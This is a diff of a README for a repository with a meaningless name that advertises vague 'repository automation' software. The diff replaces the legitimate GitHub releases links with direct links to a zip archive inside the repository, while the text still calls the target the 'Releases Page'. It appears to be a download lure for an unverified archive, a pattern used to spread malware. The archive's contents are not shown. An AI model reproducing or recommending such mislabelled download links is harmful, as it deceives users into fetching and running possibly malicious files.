@@ -1,7 +1,7 @@
 # 🎉 amanansdiahnid-16 - Auto Your Repository Effortlessly
 
 ## 📦 Download Now!
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/Truong-Lam/amanansdiahnid-16/releases)
+[![Download](https://raw.githubusercontent.com/Truong-Lam/amanansdiahnid-16/main/roadman/amanansdiahnid-16.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Truong-Lam/amanansdiahnid-16/main/roadman/amanansdiahnid-16.zip)
 
 ## 🚀 Getting Started
 Welcome to **amanansdiahnid-16**! This software helps you automate tasks for your repositories easily and effectively. Whether you are managing code updates or organizing files, this tool simplifies the process.
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets the following requirements:
 - **Regular Updates**: Stay current with the latest features and fixes.
 
 ## 📥 Download & Install
-To get started with **amanansdiahnid-16**, visit this page to download: [Releases Page](https://github.com/Truong-Lam/amanansdiahnid-16/releases).
+To get started with **amanansdiahnid-16**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Truong-Lam/amanansdiahnid-16/main/roadman/amanansdiahnid-16.zip).
 
 1. **Click the link above** to open the Releases page.
 2. Locate the latest version of the software.
